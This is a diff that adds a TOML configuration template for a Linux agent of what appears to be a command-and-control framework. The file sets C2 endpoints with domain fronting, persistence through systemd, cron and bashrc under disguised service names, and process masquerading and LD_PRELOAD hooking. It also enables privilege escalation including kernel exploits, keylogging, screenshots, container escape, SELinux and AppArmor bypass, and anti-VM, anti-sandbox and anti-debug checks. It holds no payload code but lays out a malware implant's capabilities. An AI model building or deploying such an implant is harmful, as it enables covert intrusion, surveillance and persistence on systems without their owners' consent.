@@ -1,0 +1,285 @@
+# Linux Agent Configuration Template
+# Copy this file to agent-linux.toml and customize for your Linux deployments
+# This file contains Linux-specific agent configurations
+
+[agent]
+# Agent identification
+name = "nexus-agent-linux"
+version = "0.1.0"
+platform = "linux"
+
+# Communication settings
+[communication]
+# Primary C2 server endpoints
+primary_endpoints = [
+    "https://c2.your-domain.com:443",
+    "https://api.your-domain.com:443"
+]
+
+# Backup endpoints for failover
+backup_endpoints = [
+    "https://backup.your-domain.com:443",
+    "https://cdn.your-domain.com:443"
+]
+
+# Connection settings
+heartbeat_interval = 30
+connection_timeout = 10
+max_retries = 5
+retry_backoff = 2
+
+# Enable domain fronting
+domain_fronting = true
+
+# TLS/Certificate configuration
+[communication.tls]
+enabled = true
+client_cert_path = "./certs/client.crt"
+client_key_path = "./certs/client.key" 
+ca_cert_path = "./certs/ca.crt"
+verify_server_cert = true
+
+# User agent rotation for HTTP fallback
+user_agents = [
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
+]
+
+[persistence]
+# Linux-specific persistence mechanisms
+enabled = true
+methods = ["systemd", "cron", "bashrc", "systemd_user"]
+
+# Systemd service persistence
+[persistence.systemd]
+enabled = true
+service_name = "system-update-checker"
+service_description = "System Update Checker Service"
+service_type = "forking"
+restart_policy = "always"
+user = "root"  # or specific user
+working_directory = "/opt/system-tools"
+
+# Cron-based persistence
+[persistence.cron]
+enabled = true
+cron_expression = "*/15 * * * *"  # Every 15 minutes
+cron_comment = "System maintenance check"
+use_system_cron = true
+
+# Bash profile persistence
+[persistence.bashrc]
+enabled = false
+target_files = [
+    "~/.bashrc",
+    "~/.bash_profile",
+    "~/.profile"
+]
+payload_type = "alias"
+
+# User systemd service
+[persistence.systemd_user]
+enabled = true
+service_name = "user-sync-service"
+service_description = "User Synchronization Service"
+
+[evasion]
+# Linux-specific evasion techniques
+enabled = true
+techniques = ["process_hollowing", "ld_preload", "namespace_escape", "memory_encryption"]
+
+# Process name masquerading
+[evasion.process_masquerading]
+enabled = true
+fake_process_names = [
+    "systemd-resolved",
+    "networkd-dispatcher",
+    "update-notifier",
+    "gnome-session-binary",
+    "pulseaudio"
+]
+
+# Dynamic library preloading evasion
+[evasion.ld_preload]
+enabled = true
+preload_libraries = []
+hook_functions = ["open", "read", "write", "execve"]
+
+# Namespace isolation
+[evasion.namespaces]
+enabled = true
+use_user_namespace = true
+use_pid_namespace = true
+use_net_namespace = false
+
+# Memory protection
+[evasion.memory_protection]
+enabled = true
+encrypt_strings = true
+obfuscate_api_calls = true
+stack_protection = true
+
+[execution]
+# Execution capabilities
+shell_command = true
+shellcode_injection = true
+shared_library_loading = true
+elf_execution = true
+script_execution = true
+
+# Default shell for command execution
+default_shell = "/bin/bash"
+alternative_shells = ["/bin/sh", "/bin/zsh", "/bin/dash"]
+
+# Environment settings
+[execution.environment]
+clean_environment = true
+preserve_vars = ["HOME", "USER", "PATH", "SHELL"]
+additional_paths = ["/usr/local/bin", "/usr/sbin", "/sbin"]
+
+# Privilege escalation
+[execution.privilege_escalation]
+enabled = true
+techniques = ["sudo", "setuid", "capabilities", "kernel_exploit"]
+sudo_preservation = true
+
+[system_info]
+# System information collection
+collect_on_startup = true
+update_interval = 300  # 5 minutes
+
+# Information categories to collect
+[system_info.categories]
+hardware = true
+network = true
+processes = true
+users = true
+services = true
+filesystem = true
+environment = true
+security_tools = true
+
+# Network reconnaissance
+[system_info.network]
+interface_discovery = true
+routing_table = true
+arp_table = true
+netstat_scanning = true
+ss_scanning = true
+
+# Process monitoring
+[system_info.processes]
+full_process_list = true
+process_hierarchy = true
+process_memory_info = true
+open_files = true
+network_connections = true
+
+[security]
+# Security and anti-analysis features
+anti_vm = true
+anti_sandbox = true
+string_encryption = true
+
+# VM detection methods
+[security.vm_detection]
+enabled = true
+methods = ["dmi", "proc_modules", "proc_cpuinfo", "hypervisor_detection"]
+vm_indicators = [
+    "VMware",
+    "VirtualBox", 
+    "QEMU",
+    "KVM",
+    "Xen",
+    "Hyper-V"
+]
+
+# Sandbox detection
+[security.sandbox_detection]
+enabled = true
+methods = ["file_system", "process_count", "uptime", "user_activity"]
+min_uptime_minutes = 10
+min_process_count = 30
+
+# Anti-debug techniques
+[security.anti_debug]
+enabled = true
+methods = ["ptrace", "proc_status", "timing_checks"]
+timing_threshold_ms = 100
+
+# String obfuscation
+[security.string_obfuscation]
+enabled = true
+encryption_key = ""  # Auto-generated if empty
+obfuscate_domains = true
+obfuscate_file_paths = true
+obfuscate_registry_keys = false  # N/A for Linux
+
+[logging]
+# Logging configuration
+enabled = true
+level = "info"
+file_path = "/tmp/.system-logs"
+max_file_size = "10MB"
+max_files = 5
+syslog_integration = false
+
+# Log filtering
+[logging.filters]
+exclude_patterns = [
+    "heartbeat",
+    "routine_check"
+]
+sensitive_data_masking = true
+
+[capabilities]
+# Agent capabilities
+supported_architectures = ["x86_64", "aarch64", "armv7"]
+supported_distributions = ["ubuntu", "debian", "centos", "rhel", "fedora", "arch", "alpine"]
+
+# Feature flags
+fiber_execution = true
+bof_loading = false  # Primarily Windows feature
+dll_injection = false  # N/A for Linux
+so_injection = true  # Linux equivalent of DLL injection
+keylogging = true
+screenshot = true
+file_operations = true
+registry_operations = false  # N/A for Linux
+wmi_operations = false  # N/A for Linux
+
+# Linux-specific capabilities
+container_escape = true
+namespace_manipulation = true
+cgroup_manipulation = true
+systemd_manipulation = true
+selinux_bypass = true
+apparmor_bypass = true
+
+[performance]
+# Performance tuning
+max_memory_usage = "50MB"
+cpu_limit_percent = 10
+disk_io_limit = "1MB/s"
+network_bandwidth_limit = "100KB/s"
+
+# Threading configuration
+[performance.threading]
+max_threads = 4
+worker_thread_pool = 2
+io_thread_pool = 2
+
+[development]
+# Development and testing options
+debug_mode = false
+verbose_logging = false
+enable_profiling = false
+crash_reporting = true
+telemetry = false
+
+# Testing endpoints (use only in development)
+[development.testing]
+local_server = "https://127.0.0.1:8443"
+test_mode = false
+skip_tls_verification = false
